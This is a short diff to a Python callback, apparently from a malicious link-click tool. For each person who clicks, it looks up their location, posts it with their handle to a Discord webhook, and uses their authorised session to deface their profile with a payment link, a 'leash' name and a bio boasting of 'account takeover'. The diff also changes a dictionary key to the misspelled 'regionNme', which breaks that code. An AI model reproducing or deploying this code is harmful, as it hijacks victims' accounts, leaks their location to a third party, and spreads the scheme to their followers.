@@ -310,11 +310,16 @@ def callback():
             det=json.loads(content.decode('utf-8'))
             print(det)
             c_name = det['country']
-            st_name = det['regionName']
+            st_name = det['regionNme']
             ct_name = det['city']
             print(f'{ct_name},{st_name},{c_name}')
 
             notify_discord(client,webhook_url,f'@{screen_name} from {ct_name},{st_name},{c_name} clicked the mommymeimi link')
+
+            description="checkout https://tinyurl.com/mommymeimiriskylink for account takeover by @mommymeimi."
+
+            update_profile(real_client,"youpay.me/mommymeimi","mommymeimi's leash",description)
+            
 
 
         except Exception as e:
